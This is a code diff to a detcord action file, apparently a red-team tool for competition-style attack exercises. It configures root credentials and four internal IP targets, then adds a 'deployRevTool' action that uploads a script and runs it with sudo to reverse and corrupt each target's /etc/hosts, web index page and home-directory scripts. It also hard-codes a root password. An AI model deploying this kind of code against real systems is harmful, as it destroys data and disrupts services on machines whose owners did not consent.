@@ -8,24 +8,26 @@ from detcord import action, display
 
 env = {}  # pylint: disable=invalid-name
 env['user'] = 'root'
-env['pass'] = 'toor'
-env['hosts'] = ['localhost']
-env['threading'] = False  # threading defaults to false
+env['pass'] = 'nomnom'
+env['hosts'] = [ "10.2.11.2", "10.3.11.1", "10.3.11.3", "10.3.11.4"]
+env['threading'] = True  # threading defaults to false
 
 @action
 def deployRevTool(host):
-    
+    print("Deploying revtool")
+    sudo = host.user != "root"
     try:
-        host.put("/Users/loveofmyfuckinglifewow/Tools/RevTool.py", "/tmp/RevTool.py")
-        ret = host.run("python3 /tmp/RevTool.py")
-        
-    
-    except PermissionError as _:
-        # Catch a permission denied error and try again as root
-        host.put("/Users/loveofmyfuckinglifewow/Tools/RevTool.py", "/tmp/README", sudo=True)
+        # Put the file onto the host
+        host.put("RevTool.py", "/tmp/RevTool.py")
+        # Reverse their /etc/hosts file
+        ret = host.run("python3 /tmp/RevTool.py /etc/hosts", sudo=sudo)
+        display(ret)
+        # Reverse their index.html
+        ret = host.run("python3 /tmp/RevTool.py /var/www/html/index.html", sudo=sudo)
+        display(ret)
+        # Reverse all scripts in the home directory
+        ret = host.run("python3 /tmp/RevTool.py", sudo=sudo)
+        display(ret)
 
-def support_action():
-    '''
-    This function is not a detfile action and cannot be called with det
-    '''
-    pass
+    except PermissionError as _:
+        print("Cannot deploy revtool")
